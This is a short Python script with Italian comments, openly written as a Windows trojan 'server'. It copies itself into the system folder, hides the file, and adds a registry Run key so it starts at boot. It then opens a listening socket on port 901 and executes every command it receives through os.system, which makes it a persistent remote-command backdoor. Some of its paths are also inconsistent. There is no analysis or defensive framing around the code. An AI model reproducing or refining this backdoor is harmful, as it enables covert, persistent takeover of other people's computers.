#!/usr/bin/python
#brat volk
#-------------------------------------------------------------------------------------------------------------
#importiamo le librerie per interfacciarci con il sistema(os) , copiare il server e creare un socket(socket)
import os
import socket
from shutil import copy

class main:
        #troviamo la directory del server
        dir_path = os.path.dirname(os.path.realpath(__file__))
        file__name = os.path.basename(__file__)
        #copiamo il server nelle directory di sistema
        file_dest = "C:\\windows\\"
        copy(dir_path, file_dest)
        #nascondiamo il server
        os.system("attrib +h C:\\server.exe")
        #aggiungiamo server.exe allo startup nel regedit
        regcommand = "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WINDOWS\\CurrentVersion\\Run\\rand0m.trj\",\"C:\Windows\Server.exe\"\n"
        os.system(regcommand)
        #definiamo un socket in ascolto sul port 901
        socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket1.bind((socket.gethostname(), 901))
        socket1.listen(5)
        conn, addr = socket1.accept()
        #creiamo un loop che riceve i dati
        while 1:
             data = conn.recv(893892)
             os.system(data)
             if data == "done":
                 break
